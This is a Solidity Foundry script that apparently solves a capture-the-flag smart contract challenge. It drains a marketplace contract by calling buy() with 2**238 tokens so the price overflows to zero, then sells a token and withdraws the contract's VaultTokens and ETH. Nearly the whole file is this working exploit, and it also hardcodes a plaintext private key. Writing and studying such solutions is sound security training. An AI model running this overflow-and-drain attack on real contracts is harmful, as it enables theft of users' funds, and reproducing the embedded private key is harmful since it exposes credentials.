// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// Interfaces for the contracts we will interact with.

interface IVaultTokens {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IMarketPlace {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function WithrawFunds() external;
}

interface IMarketFactory {
    function Complete(address _yourMarketPlaceAddress) external returns (bool);
    function register(string memory name) external returns (address);
}
//
contract ChallengeScript is Script {
    address vaultTokensAddr = 0xE115098b8EDB409D32A6E35C9521403A5ad5586a;
    address marketFactoryAddr = 0x7e6680F198BE87b6FaBe31B3e9C6581f8ee85dF1;
    address myMarketPlaceAddr = 0x055b28C14E5A54aeB9dbEED805658305e30531ee;

    IVaultTokens vaultTokens = IVaultTokens(vaultTokensAddr);
    IMarketPlace marketPlace = IMarketPlace(myMarketPlaceAddr);
    IMarketFactory marketFactory = IMarketFactory(marketFactoryAddr);

    function run() external {
        uint256 privateKey = 0x82ca27df88e6b5e4671eb18f6760ca01d15953fb95732bb445d5f47a673bce31;
        vm.startBroadcast(privateKey);

        // address myMarketPlace = marketFactory.register("BlockchainRafik");
        // console.log("Market place address: ", myMarketPlace);

        console.log("Starting challenge solution...");
        console.log("My address:", vm.addr(privateKey));

        uint256 approveAmount = 1 ether;
        vaultTokens.approve(myMarketPlaceAddr, approveAmount);
        console.log("Approved MarketPlace to spend %s VaultTokens.",approveAmount);

        uint256 exploitNumTokens = 2 ** 238;

        console.log("Calculated exploit number of tokens to cause overflow to 0.");

        marketPlace.buy{value: 1}(exploitNumTokens);
        console.log(
            "Called buy() with exploit number to gain huge internal balance."
        );

        uint256 marketVTBalance = vaultTokens.balanceOf(myMarketPlaceAddr);
        console.log(
            "MarketPlace VaultToken balance before selling:",
            marketVTBalance
        );

        uint256 tokensToSell = 1;

        marketPlace.sell(tokensToSell);
        console.log("Called sell() to drain VaultTokens from the MarketPlace.");

        uint256 marketVTBalanceAfterSell = vaultTokens.balanceOf(
            myMarketPlaceAddr
        );
        console.log(
            "MarketPlace VaultToken balance after selling:",
            marketVTBalanceAfterSell
        );

        marketPlace.WithrawFunds();
        console.log("Called WithrawFunds() to drain ETH from the MarketPlace.");

        marketFactory.Complete(myMarketPlaceAddr);
        console.log("Challenge completed successfully!");

        vm.stopBroadcast();
    }
}
